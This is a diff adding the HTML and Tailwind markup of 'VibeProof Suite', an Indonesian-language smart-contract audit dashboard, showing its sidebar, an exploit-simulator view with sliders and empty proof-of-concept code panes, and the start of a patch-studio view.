@@ -1,0 +1,2768 @@
+<!DOCTYPE html>
+<html lang="id" class="scroll-smooth">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>VibeProof Suite — Exploit Simulator, Patch Studio, Risk Radar, Proof Portal, Repo Importer, Gas Profiler & Dev Portal</title>
+<meta name="description" content="Modul lanjutan VibeProof di BOT Chain: AI Exploit Simulator & PoC Playground, 1-Click AI Patch Studio, Ecosystem Risk Radar, Public Proof Portal + PDF Report, Multi-Contract Repo Importer, Gas Profiler, dan Developer Portal / On-Chain Firewall SDK." />
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource-variable/plus-jakarta-sans/index.css" />
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource-variable/jetbrains-mono/index.css" />
+
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = {
+  theme: {
+    extend: {
+      colors: {
+        ink:   { 950:'#07080c', 900:'#090a0f', 850:'#0c0e14', 800:'#0f1117', 700:'#141720', 600:'#181b23', 500:'#1f232e' },
+        cyber: { DEFAULT:'#00F0FF', 600:'#06b6d4', 700:'#0e7490' },
+        safe:'#10b981', warn:'#f59e0b', crit:'#f43f5e'
+      },
+      fontFamily: {
+        sans:['"Plus Jakarta Sans Variable"','Plus Jakarta Sans','Inter','system-ui','sans-serif'],
+        mono:['"JetBrains Mono Variable"','JetBrains Mono','ui-monospace','SFMono-Regular','monospace']
+      },
+      boxShadow: {
+        'glow-cyber':'0 0 0 1px rgba(0,240,255,.30), 0 0 28px -6px rgba(0,240,255,.50)',
+        'glow-safe':'0 0 0 1px rgba(16,185,129,.35), 0 0 28px -6px rgba(16,185,129,.50)',
+        'glow-crit':'0 0 0 1px rgba(244,63,94,.35), 0 0 28px -6px rgba(244,63,94,.45)'
+      }
+    }
+  }
+}
+</script>
+
+<style>
+:root{color-scheme:dark}
+::selection{background:rgba(0,240,255,.25);color:#e4feff}
+.scroll-thin::-webkit-scrollbar{width:8px;height:8px}
+.scroll-thin::-webkit-scrollbar-thumb{background:#262a35;border-radius:8px}
+.scroll-thin::-webkit-scrollbar-thumb:hover{background:#343a48}
+.scroll-thin::-webkit-scrollbar-track{background:transparent}
+
+.glass{background:rgba(9,10,15,.72);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px)}
+.grid-lines{background-image:linear-gradient(rgba(255,255,255,.035) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.035) 1px,transparent 1px);background-size:44px 44px}
+.suite-bg{background-image:url('https://image.qwenlm.ai/public_source/fd9e50b2-dd67-4b96-aeb8-ca7c2ba7dd2d/155619159-0b65-447a-91d9-ab8842613436.png');background-size:cover;background-position:center}
+
+@keyframes pulseDot{0%,100%{box-shadow:0 0 0 0 rgba(16,185,129,.55)}70%{box-shadow:0 0 0 7px rgba(16,185,129,0)}}
+.dot-live{animation:pulseDot 2s infinite}
+@keyframes spin360{to{transform:rotate(360deg)}}
+.spin{animation:spin360 .9s linear infinite}
+@keyframes riseIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.rise-in{animation:riseIn .45s cubic-bezier(.22,1,.36,1) both}
+@keyframes floaty{0%,100%{transform:translateY(0)}50%{transform:translateY(-5px)}}
+.floaty{animation:floaty 5s ease-in-out infinite}
+@keyframes dash{to{stroke-dashoffset:-24}}
+.flow-dash{stroke-dasharray:6 6;animation:dash 1s linear infinite}
+@keyframes blinkCaret{50%{opacity:0}}
+.caret{animation:blinkCaret 1s steps(1) infinite}
+
+.btn-cyber{transition:box-shadow .25s ease,transform .15s ease,background-color .2s ease,border-color .2s ease}
+.btn-cyber:hover{box-shadow:0 0 0 1px rgba(0,240,255,.45),0 0 34px -6px rgba(0,240,255,.55);transform:translateY(-1px)}
+.btn-cyber:active{transform:translateY(0)}
+.chip{white-space:nowrap}
+
+.nav-item{transition:background-color .18s,color .18s,border-color .18s}
+.nav-item.active{background:rgba(0,240,255,.08);color:#00F0FF;border-color:rgba(0,240,255,.35)}
+
+.tbl th{font-size:10px;letter-spacing:.12em;text-transform:uppercase;color:#71717a;font-weight:700}
+.tbl td{border-top:1px solid rgba(39,39,42,.7)}
+.tbl tbody tr{transition:background-color .15s}
+.tbl tbody tr:hover{background:rgba(24,27,35,.65)}
+
+pre.code{font-family:'JetBrains Mono Variable',ui-monospace,monospace;font-size:11.5px;line-height:1.65;white-space:pre;tab-size:2}
+.d-row{display:grid;grid-template-columns:42px minmax(0,1fr) 42px minmax(0,1fr)}
+.d-del{background:rgba(244,63,94,.10);border-left:2px solid rgba(244,63,94,.6)}
+.d-add{background:rgba(16,185,129,.10);border-left:2px solid rgba(16,185,129,.6)}
+.d-ctx{border-left:2px solid transparent}
+.dropzone.drag{border-color:#00F0FF;background:rgba(0,240,255,.06)}
+
+.gnode{cursor:grab}
+.gnode:active{cursor:grabbing}
+.gnode text{font-family:'JetBrains Mono Variable',monospace}
+
+input[type=range]{-webkit-appearance:none;appearance:none;height:4px;border-radius:9999px;background:#1f232e;outline:none}
+input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:16px;height:16px;border-radius:50%;background:#00F0FF;border:2px solid #090a0f;cursor:pointer;box-shadow:0 0 10px rgba(0,240,255,.6)}
+input[type=range]::-moz-range-thumb{width:14px;height:14px;border-radius:50%;background:#00F0FF;border:2px solid #090a0f;cursor:pointer}
+
+.og-wrap{position:relative;width:100%;aspect-ratio:1200/630;overflow:hidden;border-radius:12px}
+.og-inner{width:1200px;height:630px;transform-origin:top left}
+
+#printArea{display:none}
+@media print{
+  body{background:#fff}
+  body *{visibility:hidden !important}
+  #printArea,#printArea *{visibility:visible !important}
+  #printArea{display:block !important;position:absolute;left:0;top:0;width:100%;background:#fff;color:#111}
+  .no-print{display:none !important}
+}
+</style>
+</head>
+
+<body class="bg-ink-900 text-zinc-300 font-sans antialiased min-h-screen">
+<div id="scrollProgress" class="fixed top-0 left-0 h-[2px] w-0 z-[60] bg-gradient-to-r from-cyber via-cyber-600 to-safe"></div>
+
+<!-- ══════════ HEADER ══════════ -->
+<header class="sticky top-0 z-50 glass border-b border-zinc-800/80">
+  <nav class="max-w-[1680px] mx-auto px-4 sm:px-6 h-16 flex items-center gap-3">
+    <button id="sidebarToggle" class="lg:hidden h-10 w-10 grid place-items-center rounded-lg border border-zinc-800 text-zinc-400 hover:text-white" aria-label="Buka sidebar">
+      <svg viewBox="0 0 24 24" class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg>
+    </button>
+    <a href="index.html" class="flex items-center gap-2.5 shrink-0 group">
+      <span class="relative grid place-items-center w-9 h-9 rounded-xl border border-cyber/40 bg-cyber/10">
+        <svg viewBox="0 0 24 24" class="w-5 h-5 text-cyber" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2.5 4.5 5.6v5.2c0 4.7 3.2 8.6 7.5 10.7 4.3-2.1 7.5-6 7.5-10.7V5.6L12 2.5Z"/><path d="m9 11.8 2.2 2.2L15.4 9.6"/></svg>
+        <span class="absolute inset-0 rounded-xl shadow-glow-cyber opacity-0 group-hover:opacity-100 transition-opacity"></span>
+      </span>
+      <span class="text-lg font-extrabold tracking-tight text-white">Vibe<span class="text-cyber">Proof</span></span>
+      <span class="chip hidden sm:inline-flex items-center h-6 px-2.5 rounded-full border border-zinc-700 bg-ink-800 text-zinc-300 text-[10px] font-bold tracking-widest uppercase">Security Suite</span>
+    </a>
+
+    <div class="flex-1"></div>
+
+    <div class="hidden xl:flex items-center gap-1.5 mr-2">
+      <a href="index.html" class="chip h-9 px-3 inline-flex items-center rounded-lg text-[11px] font-semibold text-zinc-400 hover:text-cyber hover:bg-ink-700 transition-colors">Audit Studio</a>
+      <a href="dashboard.html" class="chip h-9 px-3 inline-flex items-center rounded-lg text-[11px] font-semibold text-zinc-400 hover:text-cyber hover:bg-ink-700 transition-colors">Dashboard</a>
+    </div>
+
+    <div class="flex items-center rounded-full border border-zinc-800 bg-ink-800 p-1" role="group" aria-label="Pilih jaringan BOT Chain">
+      <button data-net="testnet" class="net-btn chip h-8 px-3 rounded-full text-xs font-semibold transition-colors">Testnet (968)</button>
+      <button data-net="mainnet" class="net-btn chip h-8 px-3 rounded-full text-xs font-semibold transition-colors">Mainnet (677)</button>
+    </div>
+
+    <button id="walletBtn" class="chip h-10 px-4 rounded-lg border border-cyber/50 bg-cyber/10 text-cyber text-xs font-bold hover:bg-cyber/20 transition-colors inline-flex items-center gap-2">
+      <svg viewBox="0 0 24 24" class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><path d="M3 7.5A2.5 2.5 0 0 1 5.5 5H18a2 2 0 0 1 2 2v1"/><path d="M3 7.5V17a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-6a2 2 0 0 0-2-2H5.5A2.5 2.5 0 0 1 3 7.5Z"/><circle cx="16.5" cy="14" r="1.2" fill="currentColor" stroke="none"/></svg>
+      <span id="walletLabel">Connect MetaMask</span>
+    </button>
+  </nav>
+</header>
+
+<div class="max-w-[1680px] mx-auto flex">
+  <!-- ══════════ SIDEBAR ══════════ -->
+  <div id="sidebarBackdrop" class="fixed inset-0 z-[55] bg-black/60 backdrop-blur-sm hidden lg:hidden"></div>
+  <aside id="sidebar" class="fixed lg:sticky z-[56] lg:z-0 top-16 left-0 h-[calc(100vh-4rem)] w-64 shrink-0 border-r border-zinc-800 bg-ink-850 -translate-x-full lg:translate-x-0 transition-transform duration-300 flex flex-col overflow-y-auto scroll-thin">
+    <nav class="p-3 space-y-1">
+      <p class="pt-1 pb-1 px-3 text-[10px] font-bold uppercase tracking-widest text-zinc-600">Dashboard</p>
+      <a href="dashboard.html" class="nav-item w-full h-10 px-3 rounded-lg border border-transparent flex items-center gap-3 text-[13px] font-semibold text-zinc-400 hover:text-white hover:bg-ink-700">
+        <svg viewBox="0 0 24 24" class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><rect x="3" y="3" width="8" height="8" rx="2"/><rect x="13" y="3" width="8" height="5" rx="2"/><rect x="13" y="10" width="8" height="11" rx="2"/><rect x="3" y="13" width="8" height="8" rx="2"/></svg>
+        Overview & Audits
+      </a>
+
+      <p class="pt-4 pb-1 px-3 text-[10px] font-bold uppercase tracking-widest text-zinc-600">AI Security Suite</p>
+      <button data-view="exploit" class="nav-item active w-full h-10 px-3 rounded-lg border border-transparent flex items-center gap-3 text-[13px] font-semibold text-zinc-400 hover:text-white hover:bg-ink-700">
+        <svg viewBox="0 0 24 24" class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M14.5 3 21 9.5 9.5 21H3v-6.5L14.5 3Z"/><path d="m12 6 6 6"/></svg>
+        Exploit Simulator
+        <span class="ml-auto chip h-5 px-1.5 inline-flex items-center rounded bg-crit/15 border border-crit/40 text-crit text-[9px] font-extrabold">P1</span>
+      </button>
+      <button data-view="patch" class="nav-item w-full h-10 px-3 rounded-lg border border-transparent flex items-center gap-3 text-[13px] font-semibold text-zinc-400 hover:text-white hover:bg-ink-700">
+        <svg viewBox="0 0 24 24" class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v6m0 0 3-3m-3 3-3-3"/><path d="M4 14h16v5a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2v-5Z"/></svg>
+        Patch Studio
+        <span class="ml-auto chip h-5 px-1.5 inline-flex items-center rounded bg-warn/15 border border-warn/40 text-warn text-[9px] font-extrabold">P2</span>
+      </button>
+      <button data-view="radar" class="nav-item w-full h-10 px-3 rounded-lg border border-transparent flex items-center gap-3 text-[13px] font-semibold text-zinc-400 hover:text-white hover:bg-ink-700">
+        <svg viewBox="0 0 24 24" class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="4.5"/><path d="M12 12 19 6"/></svg>
+        Risk Radar
+        <span class="ml-auto chip h-5 px-1.5 inline-flex items-center rounded bg-cyber/15 border border-cyber/40 text-cyber text-[9px] font-extrabold">P3</span>
+      </button>
+      <button data-view="proof" class="nav-item w-full h-10 px-3 rounded-lg border border-transparent flex items-center gap-3 text-[13px] font-semibold text-zinc-400 hover:text-white hover:bg-ink-700">
+        <svg viewBox="0 0 24 24" class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M7 3h7l4 4v14H7z"/><path d="M14 3v4h4"/><path d="m10 14 1.6 1.6L15 12"/></svg>
+        Proof Portal & PDF
+        <span class="ml-auto chip h-5 px-1.5 inline-flex items-center rounded bg-safe/15 border border-safe/40 text-safe text-[9px] font-extrabold">P4</span>
+      </button>
+      <button data-view="repo" class="nav-item w-full h-10 px-3 rounded-lg border border-transparent flex items-center gap-3 text-[13px] font-semibold text-zinc-400 hover:text-white hover:bg-ink-700">
+        <svg viewBox="0 0 24 24" class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4 5a2 2 0 0 1 2-2h9l5 5v11a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2z"/><path d="M8 10h8M8 14h5"/></svg>
+        Repo Importer
+        <span class="ml-auto chip h-5 px-1.5 inline-flex items-center rounded bg-zinc-700 border border-zinc-600 text-zinc-300 text-[9px] font-extrabold">P5</span>
+      </button>
+      <button data-view="gas" class="nav-item w-full h-10 px-3 rounded-lg border border-transparent flex items-center gap-3 text-[13px] font-semibold text-zinc-400 hover:text-white hover:bg-ink-700">
+        <svg viewBox="0 0 24 24" class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2 4 14h6l-1 8 9-12h-6l1-8Z"/></svg>
+        Gas Profiler
+        <span class="ml-auto chip h-5 px-1.5 inline-flex items-center rounded bg-zinc-700 border border-zinc-600 text-zinc-300 text-[9px] font-extrabold">P6</span>
+      </button>
+      <button data-view="devportal" class="nav-item w-full h-10 px-3 rounded-lg border border-transparent flex items-center gap-3 text-[13px] font-semibold text-zinc-400 hover:text-white hover:bg-ink-700">
+        <svg viewBox="0 0 24 24" class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="m9 8-5 4 5 4M15 8l5 4-5 4"/></svg>
+        Dev Portal & SDK
+        <span class="ml-auto chip h-5 px-1.5 inline-flex items-center rounded bg-zinc-700 border border-zinc-600 text-zinc-300 text-[9px] font-extrabold">P7</span>
+      </button>
+
+      <p class="pt-4 pb-1 px-3 text-[10px] font-bold uppercase tracking-widest text-zinc-600">External</p>
+      <a href="index.html" class="nav-item w-full h-10 px-3 rounded-lg border border-transparent flex items-center gap-3 text-[13px] font-semibold text-zinc-400 hover:text-white hover:bg-ink-700">
+        <svg viewBox="0 0 24 24" class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><circle cx="11" cy="11" r="6.5"/><path d="m20 20-4.4-4.4"/><path d="M11 8v6M8 11h6"/></svg>
+        Audit Studio
+      </a>
+      <a id="sideExplorer" href="https://scan.bohr.life" target="_blank" rel="noopener" class="nav-item w-full h-10 px-3 rounded-lg border border-transparent flex items-center gap-3 text-[13px] font-semibold text-zinc-400 hover:text-white hover:bg-ink-700">
+        <svg viewBox="0 0 24 24" class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><path d="M14 4h6v6"/><path d="M20 4 10 14"/><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/></svg>
+        BOTScan Explorer
+      </a>
+    </nav>
+
+    <div class="mt-auto p-3 space-y-3">
+      <div class="rounded-xl border border-zinc-800 bg-ink-800 p-3">
+        <p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500 mb-1.5">VibeProof.sol</p>
+        <p class="font-mono text-[10.5px] text-cyber break-all">0x97E0…F578</p>
+        <div class="mt-2 flex items-center gap-1.5">
+          <span class="chip h-5 px-2 inline-flex items-center rounded-full bg-safe/10 border border-safe/40 text-safe text-[9px] font-extrabold tracking-widest uppercase">Verified</span>
+          <span class="chip h-5 px-2 inline-flex items-center rounded-full bg-ink-700 border border-zinc-800 font-mono text-[9px] text-zinc-400">^0.8.20</span>
+        </div>
+      </div>
+      <div class="rounded-xl border border-zinc-800 bg-ink-800 p-3 font-mono text-[10.5px]">
+        <div class="flex items-center gap-2"><span class="w-1.5 h-1.5 rounded-full bg-safe dot-live"></span><span id="sideNetName" class="text-zinc-300 font-bold">BOT Chain Testnet</span></div>
+        <div class="mt-2 space-y-1 text-zinc-500">
+          <div class="flex justify-between"><span>Chain ID</span><span id="sideChainId" class="text-zinc-300">968</span></div>
+          <div class="flex justify-between"><span>Block</span><span id="sideBlock" class="text-cyber">#3,412,880</span></div>
+          <div class="flex justify-between"><span>Gas</span><span class="text-zinc-300">1.2 gwei</span></div>
+        </div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- ══════════ MAIN ══════════ -->
+  <main class="flex-1 min-w-0 px-4 sm:px-6 py-6 space-y-6">
+
+    <!-- ═══════════ VIEW 1 · EXPLOIT SIMULATOR ═══════════ -->
+    <section id="view-exploit" class="space-y-5">
+      <div class="relative overflow-hidden rounded-2xl border border-crit/25">
+        <div class="absolute inset-0 suite-bg opacity-25"></div>
+        <div class="absolute inset-0 bg-gradient-to-r from-ink-900 via-ink-900/85 to-ink-900/40"></div>
+        <div class="relative p-6 flex flex-wrap items-center gap-4">
+          <span class="grid place-items-center w-12 h-12 rounded-xl border border-crit/40 bg-crit/10 text-crit">
+            <svg viewBox="0 0 24 24" class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M14.5 3 21 9.5 9.5 21H3v-6.5L14.5 3Z"/><path d="m12 6 6 6"/></svg>
+          </span>
+          <div class="flex-1 min-w-[240px]">
+            <p class="chip text-[10px] font-extrabold tracking-[0.25em] uppercase text-crit">Priority #1 · Game Changer</p>
+            <h1 class="mt-1 text-xl sm:text-2xl font-extrabold text-white tracking-tight">AI Exploit Simulator & PoC Playground</h1>
+            <p class="mt-1 text-[13px] text-zinc-400">Buktikan celah itu nyata — visualisasikan vektor serangan step-by-step dan ekspor Proof-of-Concept Foundry/Hardhat yang siap dijalankan.</p>
+          </div>
+          <div class="flex flex-wrap gap-2">
+            <span class="chip h-9 px-3 inline-flex items-center rounded-lg border border-zinc-700 bg-ink-800/80 font-mono text-[11px] text-zinc-400">sandbox: local EVM fork</span>
+            <span class="chip h-9 px-3 inline-flex items-center rounded-lg border border-crit/40 bg-crit/10 font-mono text-[11px] text-crit">funds at risk: <b id="hdrLoss">12.39 ETH</b></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="grid xl:grid-cols-[320px_minmax(0,1fr)] gap-5 items-start">
+        <!-- attack list -->
+        <div class="space-y-4">
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 overflow-hidden">
+            <p class="px-4 py-3 border-b border-zinc-800 bg-ink-850 text-[10px] font-bold uppercase tracking-widest text-zinc-500">Attack Vectors (dari hasil audit)</p>
+            <div id="attackList" class="divide-y divide-zinc-800/80"></div>
+          </div>
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-4">
+            <p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500 mb-3">Simulation Parameters</p>
+            <label class="block">
+              <span class="flex justify-between font-mono text-[11px] text-zinc-400"><span>Reentrancy loops</span><span id="loopsVal" class="text-cyber">12×</span></span>
+              <input id="loopsRange" type="range" min="1" max="20" value="12" class="w-full mt-2" />
+            </label>
+            <label class="block mt-4">
+              <span class="flex justify-between font-mono text-[11px] text-zinc-400"><span>Vault liquidity (ETH)</span><span id="liqVal" class="text-cyber">12.40</span></span>
+              <input id="liqRange" type="range" min="2" max="60" value="12" class="w-full mt-2" />
+            </label>
+            <label class="block mt-4">
+              <span class="flex justify-between font-mono text-[11px] text-zinc-400"><span>Playback speed</span><span id="speedVal" class="text-cyber">1.0×</span></span>
+              <input id="speedRange" type="range" min="1" max="3" step="1" value="2" class="w-full mt-2" />
+            </label>
+            <div class="mt-4 rounded-lg border border-zinc-800 bg-ink-850 p-3 font-mono text-[10.5px] text-zinc-500">
+              <p>Projected loss: <span id="projLoss" class="text-crit font-bold">12.39 ETH</span></p>
+              <p class="mt-1">Attacker ROI: <span id="projRoi" class="text-warn font-bold">1239%</span></p>
+            </div>
+          </div>
+        </div>
+
+        <!-- simulator -->
+        <div class="space-y-5">
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 overflow-hidden">
+            <div class="flex flex-wrap items-center gap-2 px-4 py-3 border-b border-zinc-800 bg-ink-850">
+              <h3 class="text-sm font-bold text-white">Visual Attack Vector Flow</h3>
+              <span id="flowTarget" class="chip h-6 px-2.5 inline-flex items-center rounded-full bg-ink-700 border border-zinc-800 font-mono text-[10px] text-zinc-400">VulnerableVault.sol</span>
+              <span class="flex-1"></span>
+              <div class="flex items-center gap-1.5">
+                <button id="flowReset" class="chip h-9 w-9 grid place-items-center rounded-lg border border-zinc-700 bg-ink-700 text-zinc-300 hover:text-cyber hover:border-cyber/50 transition-colors" title="Reset"><svg viewBox="0 0 24 24" class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 12a9 9 0 1 0 3-6.7"/><path d="M3 4v5h5"/></svg></button>
+                <button id="flowPrev" class="chip h-9 w-9 grid place-items-center rounded-lg border border-zinc-700 bg-ink-700 text-zinc-300 hover:text-cyber hover:border-cyber/50 transition-colors" title="Step sebelumnya"><svg viewBox="0 0 24 24" class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="m14 7-5 5 5 5"/></svg></button>
+                <button id="flowPlay" class="chip h-9 px-4 rounded-lg bg-cyber text-ink-900 text-[11px] font-extrabold inline-flex items-center gap-1.5 hover:brightness-110 transition">▶ Play Attack</button>
+                <button id="flowNext" class="chip h-9 w-9 grid place-items-center rounded-lg border border-zinc-700 bg-ink-700 text-zinc-300 hover:text-cyber hover:border-cyber/50 transition-colors" title="Step berikutnya"><svg viewBox="0 0 24 24" class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="m10 7 5 5-5 5"/></svg></button>
+              </div>
+            </div>
+            <div class="p-4 bg-ink-900 overflow-x-auto scroll-thin">
+              <svg id="seqDiagram" viewBox="0 0 820 460" class="w-full min-w-[640px] h-auto"></svg>
+            </div>
+            <div class="grid sm:grid-cols-4 gap-px bg-zinc-800 border-t border-zinc-800 font-mono text-[11px]">
+              <div class="bg-ink-850 px-4 py-3"><p class="text-[9px] uppercase tracking-widest text-zinc-600">Step</p><p id="stStep" class="mt-1 text-white font-bold">0 / 0</p></div>
+              <div class="bg-ink-850 px-4 py-3"><p class="text-[9px] uppercase tracking-widest text-zinc-600">Attacker Balance</p><p id="stAttacker" class="mt-1 text-cyber font-bold">—</p></div>
+              <div class="bg-ink-850 px-4 py-3"><p class="text-[9px] uppercase tracking-widest text-zinc-600">Vault Balance</p><p id="stVault" class="mt-1 text-warn font-bold">—</p></div>
+              <div class="bg-ink-850 px-4 py-3"><p class="text-[9px] uppercase tracking-widest text-zinc-600">Mapping State</p><p id="stMap" class="mt-1 text-zinc-300 font-bold">—</p></div>
+            </div>
+            <div id="drainBanner" class="hidden border-t border-crit/30 bg-crit/10 px-4 py-3 flex flex-wrap items-center gap-3">
+              <span class="chip text-crit text-xs font-extrabold tracking-widest uppercase">⚠ VAULT DRAINED</span>
+              <span class="font-mono text-[11.5px] text-zinc-300" id="drainText"></span>
+              <span class="flex-1"></span>
+              <button id="gotoPatch" class="chip h-9 px-4 rounded-lg border border-safe/50 bg-safe/10 text-safe text-[11px] font-extrabold hover:bg-safe/20 transition-colors">Fix with AI Patch →</button>
+            </div>
+          </div>
+
+          <!-- tabs: steps / foundry / hardhat / console -->
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 overflow-hidden">
+            <div class="flex flex-wrap border-b border-zinc-800 bg-ink-850">
+              <button data-xtab="steps" class="xtab chip h-11 px-4 text-xs font-bold text-cyber border-b-2 border-cyber -mb-px">Attack Timeline</button>
+              <button data-xtab="foundry" class="xtab chip h-11 px-4 text-xs font-bold text-zinc-500 border-b-2 border-transparent -mb-px hover:text-zinc-300">Foundry PoC (.t.sol)</button>
+              <button data-xtab="hardhat" class="xtab chip h-11 px-4 text-xs font-bold text-zinc-500 border-b-2 border-transparent -mb-px hover:text-zinc-300">Hardhat PoC (.ts)</button>
+              <button data-xtab="console" class="xtab chip h-11 px-4 text-xs font-bold text-zinc-500 border-b-2 border-transparent -mb-px hover:text-zinc-300">Attack Console</button>
+            </div>
+
+            <div id="xpane-steps" class="p-4"><ol id="stepList" class="space-y-2"></ol></div>
+
+            <div id="xpane-foundry" class="hidden">
+              <div class="flex flex-wrap items-center gap-2 px-4 py-3 border-b border-zinc-800 bg-ink-850">
+                <span class="font-mono text-[11px] text-zinc-400">test/ExploitTest.t.sol</span>
+                <span class="chip h-5 px-2 inline-flex items-center rounded bg-cyber/10 border border-cyber/40 text-cyber text-[9px] font-extrabold tracking-widest uppercase">AI Generated</span>
+                <span class="flex-1"></span>
+                <button data-copy="foundryCode" class="copy-code chip h-8 px-3 rounded-lg border border-zinc-700 bg-ink-700 text-[11px] font-bold text-zinc-200 hover:border-cyber/60 hover:text-cyber transition-colors">Copy</button>
+                <button data-run="foundry" class="run-poc chip h-8 px-3 rounded-lg border border-safe/50 bg-safe/10 text-safe text-[11px] font-bold hover:bg-safe/20 transition-colors">▶ forge test</button>
+              </div>
+              <pre id="foundryCode" class="code scroll-thin max-h-[440px] overflow-auto px-4 py-3 bg-ink-900 text-zinc-300"></pre>
+            </div>
+
+            <div id="xpane-hardhat" class="hidden">
+              <div class="flex flex-wrap items-center gap-2 px-4 py-3 border-b border-zinc-800 bg-ink-850">
+                <span class="font-mono text-[11px] text-zinc-400">test/exploit.ts</span>
+                <span class="chip h-5 px-2 inline-flex items-center rounded bg-cyber/10 border border-cyber/40 text-cyber text-[9px] font-extrabold tracking-widest uppercase">AI Generated</span>
+                <span class="flex-1"></span>
+                <button data-copy="hardhatCode" class="copy-code chip h-8 px-3 rounded-lg border border-zinc-700 bg-ink-700 text-[11px] font-bold text-zinc-200 hover:border-cyber/60 hover:text-cyber transition-colors">Copy</button>
+                <button data-run="hardhat" class="run-poc chip h-8 px-3 rounded-lg border border-safe/50 bg-safe/10 text-safe text-[11px] font-bold hover:bg-safe/20 transition-colors">▶ npx hardhat test</button>
+              </div>
+              <pre id="hardhatCode" class="code scroll-thin max-h-[440px] overflow-auto px-4 py-3 bg-ink-900 text-zinc-300"></pre>
+            </div>
+
+            <div id="xpane-console" class="hidden">
+              <div class="flex items-center gap-2 px-4 py-3 border-b border-zinc-800 bg-ink-850">
+                <span class="w-2 h-2 rounded-full bg-safe dot-live"></span>
+                <span class="font-mono text-[11px] text-zinc-400">anvil fork · bot-chain-testnet · block #<span id="consBlock">3412880</span></span>
+                <span class="flex-1"></span>
+                <button id="clearConsole" class="chip h-8 px-3 rounded-lg border border-zinc-700 bg-ink-700 text-[11px] font-bold text-zinc-300 hover:border-cyber/60 transition-colors">Clear</button>
+              </div>
+              <pre id="attackConsole" class="code scroll-thin max-h-[400px] overflow-auto px-4 py-3 bg-ink-900 text-zinc-400 min-h-[220px]"></pre>
+            </div>
+
+            <div id="pocConsole" class="hidden border-t border-zinc-800 bg-ink-950 px-4 py-3 font-mono text-[11px] leading-6 text-zinc-400"></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════ VIEW 2 · PATCH STUDIO ═══════════ -->
+    <section id="view-patch" class="space-y-5 hidden">
+      <div class="relative overflow-hidden rounded-2xl border border-safe/25">
+        <div class="absolute inset-0 suite-bg opacity-20"></div>
+        <div class="absolute inset-0 bg-gradient-to-r from-ink-900 via-ink-900/85 to-ink-900/40"></div>
+        <div class="relative p-6 flex flex-wrap items-center gap-4">
+          <span class="grid place-items-center w-12 h-12 rounded-xl border border-safe/40 bg-safe/10 text-safe">
+            <svg viewBox="0 0 24 24" class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v6m0 0 3-3m-3 3-3-3"/><path d="M4 14h16v5a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2v-5Z"/></svg>
+          </span>
+          <div class="flex-1 min-w-[240px]">
+            <p class="chip text-[10px] font-extrabold tracking-[0.25em] uppercase text-safe">Priority #2 · High Utility</p>
+            <h1 class="mt-1 text-xl sm:text-2xl font-extrabold text-white tracking-tight">1-Click AI Patch & Remediation Studio</h1>
+            <p class="mt-1 text-[13px] text-zinc-400">Pilih patch per finding, lihat diff hijau/merah ala GitHub PR, lalu re-audit instan untuk melihat lonjakan skor secara live.</p>
+          </div>
+          <div class="flex flex-wrap items-center gap-3">
+            <div class="flex items-center gap-2 rounded-xl border border-zinc-800 bg-ink-800/80 px-4 py-2.5">
+              <span class="text-[10px] uppercase tracking-widest text-zinc-500">Score</span>
+              <span id="scoreBefore" class="font-mono text-lg font-extrabold text-crit">28</span>
